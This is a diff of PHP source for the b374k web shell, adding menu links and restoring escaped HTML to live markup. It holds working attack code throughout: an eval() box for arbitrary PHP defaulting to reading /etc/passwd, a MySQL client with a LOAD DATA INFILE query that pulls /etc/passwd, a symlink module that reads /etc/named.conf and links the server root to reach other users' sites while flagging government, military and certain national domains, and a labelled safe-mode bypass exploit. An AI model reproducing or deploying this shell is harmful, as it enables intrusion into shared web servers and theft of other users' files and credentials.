-   &lt;/div&gt; &lt;!-- menu2 end --&gt;
+   <a href="?<?php echo "y=" . $pwd; ?>&x=config">Config Sh3ll</a>
+     <a href="?<?php echo "y=" . $pwd; ?>&x=wp">Wordpress</a>
+	 <a href="?<?php echo "y=" . $pwd; ?>&x=joomla">Joomla</a>
+   </div> <!-- menu2 end -->
 
 
 
- <?php if (isset($_GET['x']) && ($_GET['x'] == 'php')) { ?> &lt;form action="?y=<?php echo $pwd; ?>&x=php" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td&gt; &lt;textarea class="output" name="cmd" id="cmd"&gt; <?php if (isset($_POST['submitcmd'])) {
+ <?php if (isset($_GET['x']) && ($_GET['x'] == 'php')) { ?> <form action="?y=<?php echo $pwd; ?>&x=php" method="post"> <table class="cmdbox"> <tr><td> <textarea class="output" name="cmd" id="cmd"> <?php if (isset($_POST['submitcmd'])) {
         echo eval(magicboom($_POST['cmd']));
-    } else echo "echo file_get_contents('/etc/passwd');"; ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td&gt;&lt;input style="width:6%;margin:0px;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/form&gt; <?php
+    } else echo "echo file_get_contents('/etc/passwd');"; ?> </textarea> <tr><td><input style="width:6%;margin:0px;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form> </table> </form> <?php
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'mysql')) {
     if (isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])) {
         $sqlhost = $_GET['sqlhost'];
@@ -445,13 +445,13 @@ body{ background:#000000; } a { text-decoration:none; } a:hover{
         $sqlpass = $_GET['sqlpass'];
         $sqlport = $_GET['sqlport'];
         if ($con = @mysql_connect($sqlhost . ":" . $sqlport, $sqluser, $sqlpass)) {
-            $msg.= "&lt;div style=\"width:99%;padding:4px 10px 0 10px;\"&gt;";
-            $msg.= "&lt;p&gt;Connected to " . $sqluser . "&lt;span class=\"gaya\"&gt;@&lt;/span&gt;" . $sqlhost . ":" . $sqlport;
-            $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;\"&gt;[ databases ]&lt;/a&gt;";
-            if (isset($_GET['db'])) $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "\"&gt;" . htmlspecialchars($_GET['db']) . "&lt;/a&gt;";
-            if (isset($_GET['table'])) $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "&amp;table=" . $_GET['table'] . "\"&gt;" . htmlspecialchars($_GET['table']) . "&lt;/a&gt;";
-            $msg.= "&lt;/p&gt;&lt;p&gt;version : " . mysql_get_server_info($con) . " proto " . mysql_get_proto_info($con) . "&lt;/p&gt;";
-            $msg.= "&lt;/div&gt;";
+            $msg.= "<div style=\"width:99%;padding:4px 10px 0 10px;\">";
+            $msg.= "<p>Connected to " . $sqluser . "<span class=\"gaya\">@</span>" . $sqlhost . ":" . $sqlport;
+            $msg.= "&nbsp;&nbsp;<span class=\"gaya\">-></span>&nbsp;&nbsp;<a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;\">[ databases ]</a>";
+            if (isset($_GET['db'])) $msg.= "&nbsp;&nbsp;<span class=\"gaya\">-></span>&nbsp;&nbsp;<a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "\">" . htmlspecialchars($_GET['db']) . "</a>";
+            if (isset($_GET['table'])) $msg.= "&nbsp;&nbsp;<span class=\"gaya\">-></span>&nbsp;&nbsp;<a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "&amp;table=" . $_GET['table'] . "\">" . htmlspecialchars($_GET['table']) . "</a>";
+            $msg.= "</p><p>version : " . mysql_get_server_info($con) . " proto " . mysql_get_proto_info($con) . "</p>";
+            $msg.= "</div>";
             echo $msg;
             if (isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))) {
                 $db = $_GET['db'];
@@ -460,31 +460,31 @@ CREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );
 LOAD DATA INFILE \"/etc/passwd\"
 INTO TABLE b374k_table;SELECT * FROM b374k_table;
 DROP TABLE IF EXISTS b374k_table;";
-                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;$query&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
+                $msg = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">$query</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
                 $tables = array();
-                $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;&lt;th&gt;available tables on " . $db . "&lt;/th&gt;&lt;/tr&gt;";
+                $msg.= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available tables on " . $db . "</th></tr>";
                 $hasil = @mysql_list_tables($db, $con);
                 while (list($table) = @mysql_fetch_row($hasil)) {
                     @array_push($tables, $table);
                 }
                 @sort($tables);
                 foreach ($tables as $table) {
-                    $msg.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "&amp;table=" . $table . "\"&gt;$table&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
+                    $msg.= "<tr><td><a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "&amp;table=" . $table . "\">$table</a></td></tr>";
                 }
-                $msg.= "&lt;/table&gt;";
+                $msg.= "</table>";
             } elseif (isset($_GET['table']) && (!isset($_GET['sqlquery']))) {
                 $db = $_GET['db'];
                 $table = $_GET['table'];
                 $query = "SELECT * FROM " . $db . "." . $table . " LIMIT 0,100;";
-                $msgq = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
+                $msgq = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">" . $query . "</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
                 $columns = array();
-                $msg = "&lt;table class=\"explore\" style=\"width:99%;\"&gt;";
+                $msg = "<table class=\"explore\" style=\"width:99%;\">";
                 $hasil = @mysql_query("SHOW FIELDS FROM " . $db . "." . $table);
                 while (list($column) = @mysql_fetch_row($hasil)) {
-                    $msg.= "&lt;th&gt;$column&lt;/th&gt;";
+                    $msg.= "<th>$column</th>";
                     $kolum = $column;
                 }
-                $msg.= "&lt;/tr&gt;";
+                $msg.= "</tr>";
                 $hasil = @mysql_query("SELECT count(*) FROM " . $db . "." . $table);
                 list($total) = mysql_fetch_row($hasil);
                 if (isset($_GET['z'])) $page = (int)$_GET['z'];
@@ -494,91 +494,91 @@ DROP TABLE IF EXISTS b374k_table;";
                 $start = (($page - 1) * $pagenum);
                 $hasil = @mysql_query("SELECT * FROM " . $db . "." . $table . " LIMIT " . $start . "," . $pagenum);
                 while ($datas = @mysql_fetch_assoc($hasil)) {
-                    $msg.= "&lt;tr&gt;";
+                    $msg.= "<tr>";
                     foreach ($datas as $data) {
                         if (trim($data) == "") $data = "&nbsp;";
-                        $msg.= "&lt;td&gt;$data&lt;/td&gt;";
+                        $msg.= "<td>$data</td>";
                     }
-                    $msg.= "&lt;/tr&gt;";
+                    $msg.= "</tr>";
                 }
-                $msg.= "&lt;/table&gt;";
-                $head = "&lt;div style=\"padding:10px 0 0 6px;\"&gt; &lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /&gt; Page &lt;select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\"&gt;";
-                for ($i = 1;$i &lt;= $totpage;$i++) {
-                    $head.= "&lt;option value=\"" . $i . "\"&gt;" . $i . "&lt;/option&gt;";
-                    if ($i == $_GET['z']) $head.= "&lt;option value=\"" . $i . "\" selected=\"selected\"&gt;" . $i . "&lt;/option&gt;";
+                $msg.= "</table>";
+                $head = "<div style=\"padding:10px 0 0 6px;\"> <form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /> Page <select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\">";
+                for ($i = 1;$i <= $totpage;$i++) {
+                    $head.= "<option value=\"" . $i . "\">" . $i . "</option>";
+                    if ($i == $_GET['z']) $head.= "<option value=\"" . $i . "\" selected=\"selected\">" . $i . "</option>";
                 }
-                $head.= "&lt;/select&gt;&lt;noscript&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /&gt;&lt;/noscript&gt;&lt;/form&gt;&lt;/div&gt;";
+                $head.= "</select><noscript><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /></noscript></form></div>";
                 $msg = $msgq . $head . $msg;
             } elseif (isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")) {
                 $db = $_GET['db'];
                 $query = magicboom($_GET['sqlquery']);
-                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
+                $msg = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">" . $query . "</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
                 @mysql_select_db($db);
                 $querys = explode(";", $query);
                 foreach ($querys as $query) {
                     if (trim($query) != "") {
                         $hasil = mysql_query($query);
                         if ($hasil) {
-                            $msg.= "&lt;p style=\"padding:0;margin:20px 6px 0 6px;\"&gt;" . $query . ";&nbsp;&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;[&lt;/span&gt; ok &lt;span class=\"gaya\"&gt;]&lt;/span&gt;&lt;/p&gt;";
-                            $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;";
-                            for ($i = 0;$i &lt; @mysql_num_fields($hasil);$i++) $msg.= "&lt;th&gt;" . htmlspecialchars(@mysql_field_name($hasil, $i)) . "&lt;/th&gt;";
-                            $msg.= "&lt;/tr&gt;";
-                            for ($i = 0;$i &lt; @mysql_num_rows($hasil);$i++) {
+                            $msg.= "<p style=\"padding:0;margin:20px 6px 0 6px;\">" . $query . ";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>";
+                            $msg.= "<table class=\"explore\" style=\"width:99%;\"><tr>";
+                            for ($i = 0;$i < @mysql_num_fields($hasil);$i++) $msg.= "<th>" . htmlspecialchars(@mysql_field_name($hasil, $i)) . "</th>";
+                            $msg.= "</tr>";
+                            for ($i = 0;$i < @mysql_num_rows($hasil);$i++) {
                                 $rows = @mysql_fetch_array($hasil);
-                                $msg.= "&lt;tr&gt;";
-                                for ($j = 0;$j &lt; @mysql_num_fields($hasil);$j++) {
+                                $msg.= "<tr>";
+                                for ($j = 0;$j < @mysql_num_fields($hasil);$j++) {
                                     if ($rows[$j] == "") $dataz = "&nbsp;";
                                     else $dataz = $rows[$j];
-                                    $msg.= "&lt;td&gt;" . $dataz . "&lt;/td&gt;";
+                                    $msg.= "<td>" . $dataz . "</td>";
                                 }
-                                $msg.= "&lt;/tr&gt;";
+                                $msg.= "</tr>";
                             }
-                            $msg.= "&lt;/table&gt;";
-                        } else $msg.= "&lt;p style=\"padding:0;margin:20px 6px 0 6px;\"&gt;" . $query . ";&nbsp;&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;[&lt;/span&gt; error &lt;span class=\"gaya\"&gt;]&lt;/span&gt;&lt;/p&gt;";
+                            $msg.= "</table>";
+                        } else $msg.= "<p style=\"padding:0;margin:20px 6px 0 6px;\">" . $query . ";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
                     }
                 }
             } else {
                 $query = "SHOW PROCESSLIST;
 SHOW VARIABLES;
 SHOW STATUS;";
-                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
+                $msg = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">" . $query . "</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
                 $dbs = array();
-                $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;&lt;th&gt;available databases&lt;/th&gt;&lt;/tr&gt;";
+                $msg.= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available databases</th></tr>";
                 $hasil = @mysql_list_dbs($con);
                 while (list($db) = @mysql_fetch_row($hasil)) {
                     @array_push($dbs, $db);
                 }
                 @sort($dbs);
                 foreach ($dbs as $db) {
-                    $msg.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "\"&gt;$db&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
+                    $msg.= "<tr><td><a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "\">$db</a></td></tr>";
                 }
-                $msg.= "&lt;/table&gt;";
+                $msg.= "</table>";
             }
             @mysql_close($con);
-        } else $msg = "&lt;p style=\"text-align:center;\"&gt;cant connect to mysql server&lt;/p&gt;";
+        } else $msg = "<p style=\"text-align:center;\">cant connect to mysql server</p>";
         echo $msg;
-    } else { ?> &lt;form action="?" method="get"&gt; &lt;input type="hidden" name="y" value="<?php echo $pwd; ?>" /&gt; &lt;input type="hidden" name="x" value="mysql" /&gt; &lt;table class="tabnet" style="width:300px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Connect to mySQL server&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Username&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Password&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Port&lt;/td&gt;&lt;td&gt;&lt;input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" /&gt;&nbsp;&lt;input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
+    } else { ?> <form action="?" method="get"> <input type="hidden" name="y" value="<?php echo $pwd; ?>" /> <input type="hidden" name="x" value="mysql" /> <table class="tabnet" style="width:300px;"> <tr><th colspan="2">Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr> <tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr> <tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr> <tr><td>&nbsp;&nbsp;Port</td><td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td></tr> </table> </form> <?php
     }
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'phpinfo')) {
     @ob_start();
     eval("phpinfo();");
     $buff = @ob_get_contents();
     @ob_end_clean();
-    $awal = strpos($buff, "&lt;body&gt;") + 6;
-    $akhir = strpos($buff, "&lt;/body&gt;");
-    echo "&lt;div class=\"phpinfo\"&gt;" . substr($buff, $awal, $akhir - $awal) . "&lt;/div&gt;";
+    $awal = strpos($buff, "<body>") + 6;
+    $akhir = strpos($buff, "</body>");
+    echo "<div class=\"phpinfo\">" . substr($buff, $awal, $akhir - $awal) . "</div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'logout')) {
     @session_start();
     @session_unregister("login");
-    echo "&lt;meta http-equiv='refresh' content='0; url=?y=" . $pwd . "' /&gt;";
-    "&lt;/div&gt;";
+    echo "<meta http-equiv='refresh' content='0; url=?y=" . $pwd . "' />";
+    "</div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'symlink')) {
 ?>
-&lt;form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post"&gt;
+<form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post">
 
 <?php
     @set_time_limit(0);
-    echo "&lt;center&gt;";
+    echo "<center>";
     @mkdir('sym', 0777);
     $htaccess = "Options all 
  DirectoryIndex Sux.html 
@@ -594,14 +594,14 @@ SHOW STATUS;";
     $filelocation = basename(__FILE__);
     $read_named_conf = @file('/etc/named.conf');
     if (!$read_named_conf) {
-        echo "&lt;pre class=ml1 style='margin-top:5px'&gt;# Cant access this file on server -&gt; [ /etc/named.conf ]&lt;/pre&gt;&lt;/center&gt;";
+        echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
     } else {
-        echo "&lt;br&gt;&lt;br&gt;&lt;div class='tmp'&gt;&lt;table border='1' bordercolor='#009900' width='400' cellpadding='1' cellspacing='0'&gt;&lt;td&gt;Domains&lt;/td&gt;&lt;td&gt;Users&lt;/td&gt;&lt;td&gt;symlink &lt;/td&gt;";
+        echo "<br><br><div class='tmp'><table border='1' bordercolor='#009900' width='400' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
         foreach ($read_named_conf as $subject) {
             if (eregi('zone', $subject)) {
                 preg_match_all('#zone "(.*)"#', $subject, $string);
                 flush();
-                if (strlen(trim($string[1][0])) &gt; 2) {
+                if (strlen(trim($string[1][0])) > 2) {
                     $UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
                     $name = $UID['name'];
                     @symlink('/', 'sym/root');
@@ -617,50 +617,50 @@ SHOW STATUS;";
                     $mil1 = '\.mil';
                     $mil2 = '\.mi';
                     if (eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0]) or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0])) {
-                        $name = "&lt;div style=' color: #009900 ; text-shadow: 0px 0px 1px red; '&gt;" . $string[1][0] . '&lt;/div&gt;';
+                        $name = "<div style=' color: #009900 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
                     }
                     echo "
-&lt;tr&gt;
+<tr>
 
-&lt;td&gt;
-&lt;div class='dom'&gt;&lt;a target='_blank' href=http://www." . $string[1][0] . '/&gt;' . $name . ' &lt;/a&gt; &lt;/div&gt;
-&lt;/td&gt;
+<td>
+<div class='dom'><a target='_blank' href=http://www." . $string[1][0] . '/>' . $name . ' </a> </div>
+</td>
 
-&lt;td&gt;
+<td>
 ' . $UID['name'] . "
-&lt;/td&gt;
+</td>
 
-&lt;td&gt;
-&lt;a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'&gt;Symlink &lt;/a&gt;
-&lt;/td&gt;
+<td>
+<a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
+</td>
 
-&lt;/tr&gt;&lt;/div&gt; ";
+</tr></div> ";
                     flush();
                 }
             }
         }
     }
-    echo "&lt;/center&gt;&lt;/table&gt;";
-    "&lt;/div&gt;";
+    echo "</center></table>";
+    "</div>";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'bypass')) {
-    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;b374k  Private Safe Mode Command  Bypass Exploit&lt;/font&gt;&lt;/b&gt;&lt;br&gt;
+    echo "<center/><br/><b><font color=blue>b374k  Private Safe Mode Command  Bypass Exploit</font></b><br>
 ";
     print_r('
-&lt;pre&gt;
-&lt;form method="POST" action=""&gt;
